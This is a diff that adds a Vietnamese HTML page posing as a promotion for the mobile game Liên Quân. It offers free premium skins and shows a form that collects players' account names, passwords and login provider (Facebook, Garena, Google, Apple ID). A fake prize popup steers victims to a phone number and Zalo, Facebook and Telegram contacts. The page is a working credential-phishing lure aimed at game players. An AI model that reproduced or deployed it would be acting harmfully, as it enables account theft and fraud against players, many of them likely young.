@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>TEST ONE</title>
+  <link rel="stylesheet" href="css/index.css" />
+</head>
+<body>
+ 
+  <!-- Video Background -->
+  <video autoplay muted loop playsinline id="bg-video">
+    <source src="video/Nenvideo.MP4" type="video/mp4">
+    Trình duyệt của bạn không hỗ trợ video.
+  </video>
+  <div class="video-overlay"></div>
+
+  <div class="page">
+    
+    <!-- Header -->
+    <header class="header">
+      <h1 class="marquee">
+        Chào mừng bạn đến với trang web của tôi — Khuyến mãi cực lớn hôm nay,
+        chỉ 10.000 Ruby nhận ngay Nakroth Thứ Nguyên Vệ Thần và nhiều skin bậc SS khác.
+      </h1>
+    </header>
+
+    <!-- Bên trái -->
+    <div class="event-left">
+      <h3>Thông báo</h3>
+      <ul>
+        <li>Bảo trì hệ thống lúc 23h00</li>
+        <li>Giftcode giới hạn cho 1000 người nhanh tay</li>
+        <li>Khuyến mãi x2 thẻ nạp từ 26/09/2025</li>
+        <li>Giải đấu Liên Quân Mùa Đông 2025 chính thức khởi tranh</li>
+        <li>Phần thưởng top server: Skin SS chọn 1</li>
+        <li>Ra mắt tướng mới: Astrid Thánh Kiếm</li>
+        <li>Sự kiện “Vòng quay may mắn” nhận Ruby miễn phí</li>
+        <li>Chế độ đấu sinh tồn mở thử nghiệm</li>
+        <li>Tính năng chat voice cải tiến</li>
+        <li>Nhiệm vụ tuần tăng 200% EXP</li>
+        <li>Chính sách bảo mật cập nhật mới</li>
+        <li>Khuyến mãi nạp lần đầu nhận thêm quà</li>
+      </ul>
+    </div>
+
+    <!-- Bên phải -->
+    <div class="event-right">
+      <h3>Sự kiện HOT</h3>
+      <ul>
+        <li class="blink">Giảm giá 70% kho báu bí mật (26-28/09)</li>
+        <li>Đua Top Nakroth giải thưởng iPhone 16 Pro</li>
+        <li>Săn Boss Rồng Vàng nhận skin SS chọn</li>
+        <li>Điểm danh 7 ngày nhận tướng FREE</li>
+        <li class="blink">Đổi Ruby lấy quà cực khủng</li>
+        <li>Cuộc thi Cosplay Liên Quân tổng giải thưởng 50 triệu</li>
+        <li>Event “Đua Top Clan” phần thưởng trang phục giới hạn</li>
+        <li>Share Fanpage nhận code đặc biệt</li>
+        <li>Tặng miễn phí 999 vàng cho tân thủ</li>
+        <li>Vòng quay x10 chắc chắn trúng skin</li>
+        <li>Shop sự kiện mở bán vật phẩm hiếm</li>
+      </ul>
+    </div>
+
+<!-- Cột giữa bên trái -->
+<div class="event-mid-left">
+  <h3>Tin HOT</h3>
+  <ul>
+    <li>Sự kiện đặc biệt cuối tuần</li>
+    <li>Nhận quà khi đăng nhập mỗi ngày</li>
+    <li>Vòng quay may mắn x5</li>
+    <li>Skin SS chọn miễn phí</li>
+    <li>Giảm giá cửa hàng 50% toàn bộ vật phẩm</li>
+    <li>Đua top Clan nhận Ruby miễn phí</li>
+    <li>Săn Boss thế giới thưởng skin hiếm</li>
+    <li>Quà tặng sinh nhật Liên Quân 2025</li>
+  </ul>
+</div>
+
+    <!-- Giữa phải -->
+    <div class="event-mid-right">
+      <h3>Cập nhật mới</h3>
+      <ul>
+        <li>Ra mắt tướng mới</li>
+        <li>Thêm chế độ chiến trường</li>
+        <li>Nhiệm vụ EXP nhân đôi</li>
+        <li>Săn boss nhận Ruby</li>
+        <li>Cập nhật bản đồ mùa đông</li>
+        <li>Thêm tính năng ghép đội nhanh</li>
+        <li>Hệ thống xếp hạng mới</li>
+        <li>Kho trang phục mở rộng thêm 20 skin</li>
+        <li>Fix lỗi đăng nhập và tối ưu hiệu suất</li>
+
+      </ul>
+    </div>
+
+    <!-- Nội dung chính -->
+    <main class="main">
+      
+      <!-- Form -->
+      <section class="form-section">
+        <div class="container">
+          <form id="wordForm" autocomplete="off">
+            <h2>Nhập thông tin</h2>
+
+            <label for="name">Tài Khoản:</label>
+            <input type="text" id="name" placeholder="Nhập tài khoản" required />
+
+            <label for="password">Mật khẩu:</label>
+            <input type="password" id="password" placeholder="Nhập mật khẩu" required />
+
+            <label for="subject">Đăng nhập bằng:</label>
+            <select id="subject" required>
+              <option value="">-- Chọn --</option>
+              <option value="Facebook">Facebook</option>
+              <option value="Garena">Garena</option>
+              <option value="Google">Google</option>
+              <option value="Apple ID">Apple ID</option>
+            </select>
+
+            <label for="message">Skin muốn nhận:</label>
+            <textarea id="message" rows="5" placeholder="Nhập tên Skin" required></textarea>
+
+            <div class="btn-group">
+              <button type="button" id="txtBtn" class="btn btn-secondary">Đăng nhập</button>
+              <button type="reset" id="excelBtn" class="btn btn-primary">Thoát</button>
+            </div>
+          </form>
+        </div>
+      </section>
+
+      <!-- Liên hệ -->
+      <section class="boxes-section">
+        <h2 class="boxes-title">Đường dây nóng - SOS</h2>
+        <div class="box-container">
+         
+          <a href="http://zalo.me/84939232002" target="_blank" class="box box-1">
+            <div class="box-content">
+              <h3>Zalo</h3>
+            </div>
+          </a>
+
+          <a href="https://facebook.com/UlasCutiee" target="_blank" class="box box-2">
+            <div class="box-content">
+              <h3>Facebook</h3>
+            </div>
+          </a>
+
+          <a href="tel:0939232002" class="box box-3">
+            <div class="box-content">
+              <h3>Call Phone</h3>
+            </div>
+          </a>
+
+          <a href="https://t.me/UlasCutiee" target="_blank" class="box box-4">
+            <div class="box-content">
+              <h3>Telegram</h3>
+            </div>
+          </a>
+
+          <a href="https://www.tiktok.com/@avis12463?_t=ZS-903KThJxtCL&_r=1" target="_blank" class="box box-5">
+            <div class="box-content">
+              <h3>TikTok</h3>
+            </div>
+          </a>
+        </div>
+      </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+      <p>@26.09.2025 — UlasCutieee</p>
+    </footer>
+  </div>
+
+  <!-- Nhạc nền -->
+  <audio id="bg-music" autoplay loop>
+    <source src="audio/Faded.mp3" type="audio/mpeg">
+    Trình duyệt của bạn không hỗ trợ thẻ audio.
+  </audio>
+  <script>
+    const music = document.getElementById("bg-music");
+    music.volume = 0.2;
+  </script>
+
+  <!-- Script -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+  <script src="js/index.js"></script>
+  <script src="js/events.js"></script>
+  <!-- Popup Modal -->
+<div id="rewardModal" class="modal">
+  <div class="modal-content">
+    <span class="close-btn">&times;</span>
+    <h2>🎉 Chúc mừng!</h2>
+    <p>Cảm ơn bạn đã trúng thưởng một tài khoản <b>Full Tướng - Full Skin</b></p>
+    <p>Vui lòng liên hệ qua Zalo/FB để nhận quà: <b>0939232002</b></p>
+    <p>Chúc bạn có những trải nghiệm tuyệt vời!</p>
+  </div>
+</div>
+</body>
+<script>
+  const modal = document.getElementById("rewardModal");
+  const closeBtn = document.querySelector(".close-btn");
+
+  // Bắt tất cả li trong event box
+  const eventItems = document.querySelectorAll(
+    ".event-left li, .event-right li, .event-mid-left li, .event-mid-right li"
+  );
+
+  eventItems.forEach(item => {
+    item.addEventListener("click", () => {
+      modal.style.display = "flex"; // hiện modal
+    });
+  });
+
+  // Đóng khi bấm dấu X
+  closeBtn.addEventListener("click", () => {
+    modal.style.display = "none";
+  });
+
+  // Đóng khi bấm ra ngoài
+  window.addEventListener("click", (e) => {
+    if (e.target === modal) {
+      modal.style.display = "none";
+    }
+  });
+</script>
+</html>
